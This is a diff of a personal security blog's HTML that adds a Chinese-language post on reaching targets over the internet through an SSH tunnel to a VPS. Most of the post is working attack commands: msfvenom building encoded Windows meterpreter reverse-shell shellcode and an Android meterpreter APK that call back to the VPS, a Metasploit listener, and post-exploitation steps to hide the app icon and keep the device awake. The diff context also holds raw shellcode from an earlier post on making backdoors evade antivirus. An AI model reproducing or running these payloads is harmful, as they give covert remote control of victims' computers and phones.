@@ -62,6 +62,71 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ssh-vps实现外网渗透" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/12/ssh-vps实现外网渗透/" class="article-date">
+  <time datetime="2019-02-12T12:56:19.000Z" itemprop="datePublished">2019-02-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/12/ssh-vps实现外网渗透/">ssh+vps实现外网渗透</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>Windows</strong></p>
+<p>①首先需要配置vps的ssh服务</p>
+<p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
+<p>在文件最后添加：<code>GatewayPorts yes</code></p>
+<p>然后重启ssh服务并设置为开机自启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl enable ssh</span><br></pre></td></tr></table></figure>
+<p>②然后配置msf客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=[vpsIP] lport=4444 -f c -o /home/test.c</span><br></pre></td></tr></table></figure>
+<p>③之后本地启用监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.0.124</span><br><span class="line">lhost =&gt; 192.168.0.124</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; set exitonsession false</span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.124:4444</span><br></pre></td></tr></table></figure>
+<p>④开启ssh隧道：<code>ssh -N -R 4444:192.168.0.124:4444 root@vpsIP</code></p>
+<p>⑤客户端被执行以后，就会成功返回回话……</p>
+<p><strong>Android</strong></p>
+<p>①首先需要配置vps的ssh服务</p>
+<p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
+<p>在文件最后添加：<code>GatewayPorts yes</code></p>
+<p>然后重启ssh服务并设置为开机自启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl enable ssh</span><br></pre></td></tr></table></figure>
+<p>②然后配置msf客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=vpsIP lport=4444 &gt;/home/test.apk</span><br></pre></td></tr></table></figure>
+<p>③之后本地启用监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload android/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.0.124(kali IP)</span><br><span class="line">lhost =&gt; 192.168.0.124</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>④开启ssh隧道：<code>ssh -N -R 4444:192.168.0.124:4444 root@vpsIP</code></p>
+<p>⑤将生成的APK文件发送给目标手机，下载打开就会获取控制权…..</p>
+<p><strong>一些命令：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hide_app_icon：将图标藏起来</span><br><span class="line">wakelock：来实现不休眠</span><br><span class="line">远程强制修改目标手机的壁纸图案：</span><br><span class="line">msf &gt; use post/multi/manage/set_wallpaper</span><br><span class="line">msf post(set_wallpaper)&gt; set WALLPAPER_FILE /root/Desktop/hack.jpg</span><br><span class="line">msf post(set_wallpaper)&gt; set session 1</span><br><span class="line">msf post (set_wallpaper)&gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/02/12/ssh-vps实现外网渗透/a.png" alt=""></p>
+<p><strong>总结</strong></p>
+<p>学习免杀，学习免杀，学习免杀！！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjs1tjvvw0000uov6e6y23gv8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-利用metasploit生成免杀后门" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/02/01/利用metasploit生成免杀后门/" class="article-date">
@@ -125,7 +190,7 @@
 &quot;\x3b\x12\x14\x15\xc5\x81\x2d\xf5\x54\x26\x9b\xa0\xb8\x55\x7e&quot;
 &quot;\x9a\xd1\xbe\xb7\x85\x8c\xa4\xce\xde\xf3\x7a&quot;;</code></p>
 <p>手动添加一些代码：</p>
-<p><code>#include&lt;stdio.h&gt;</code><br><code>#include&lt;windows.h&gt;</code><br><code>#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</code></p>
+<p><code>#include&lt;stdio.h&gt;</code><br><code>#include&lt;windows.h&gt;</code><br><code>#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</code>  <!--运行时不显示窗口--></p>
 <p><code>unsigned char buf[] = 
 &quot;\xb8\x3b\xc1\xbf\x73\xda\xdb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;
 &quot;\x71\x31\x42\x13\x03\x42\x13\x83\xc2\x3f\x23\x4a\xcd\x8f\xfb&quot;
@@ -226,7 +291,7 @@ __asm
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjrmzguqo0000l4v6405awjuw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjs1tjvx30001uov6vdrmbyvi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -265,6 +330,10 @@ __asm
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/02/12/ssh-vps实现外网渗透/">ssh+vps实现外网渗透</a>
+          </li>
         
           <li>
             <a href="/2019/02/01/利用metasploit生成免杀后门/">利用metasploit生成免杀后门</a>
